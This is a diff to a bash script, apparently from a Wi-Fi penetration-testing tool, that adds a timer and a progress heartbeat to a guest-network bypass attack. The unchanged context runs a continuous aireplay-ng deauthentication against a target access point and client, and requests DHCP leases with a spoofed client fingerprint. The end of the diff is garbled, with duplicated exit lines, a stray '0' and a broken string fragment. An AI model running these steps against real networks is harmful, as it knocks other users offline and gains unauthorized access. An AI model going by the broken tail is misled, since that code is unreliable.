@@ -34,6 +34,7 @@ C_RESET="${ASTRA_COLOR_RESET:-}"
 INTERFACE="${WIFI_INTERFACE:-}"
 SSID="${GUEST_SSID:-}"
 TARGET_BSSID="${GUEST_BSSID:-}"
+SCAN_TIME="${SCAN_TIME:-15}"
 SESSION_DIR="${SESSION_DIR:-.}"
 EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
 ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
@@ -65,7 +66,7 @@ if [[ -n "$TARGET_BSSID" ]]; then
         aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 &
         SUPPRESS_PID=$!
     fi
-    trap 'kill $SUPPRESS_PID 2>/dev/null || true' EXIT
+    trap 'kill ${SUPPRESS_PID:-} 2>/dev/null || true' EXIT
 fi
 
 # 2. Spoofing Execution
@@ -90,10 +91,28 @@ request subnet-mask, broadcast-address, time-offset, routers,
         rfc3442-classless-static-routes, ntp-servers;
 EOF
 
-echo -e "[*] Requesting DHCP lease with custom Fingerprint (Option 55)..."
-timeout 15 dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true
+echo -e "[*] Requesting DHCP lease with custom Fingerprint (Option 55) (${SCAN_TIME}s)..."
 
-"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 80 --status "Verifying network access..."
+# Start dynamic telemetry heartbeat
+(
+    HEARTBEAT_ELAPSED=0
+    while [[ $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
+        PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
+        [[ $PCT -gt 90 ]] && PCT=90
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
+        sleep 2
+        HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
+    done
+) &
+TELEMETRY_PID=$!
+
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    timeout "$SCAN_TIME" dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true
+else
+    timeout "$SCAN_TIME" dhclient -cf "$DHCP_CONF" "$INTERFACE" >/dev/null 2>&1 || true
+fi
+
+kill "$TELEMETRY_PID" 2>/dev/null || true
 
 # 3. Verification
 echo -e "[*] Verifying internet access..."
@@ -114,5 +133,12 @@ else
     echo -e "[+] Mission complete. Unrestricted access not achieved."
 fi
 
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
+exit 0
+0
+restricted access not achieved."
+fi
+
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
 exit 0
 0
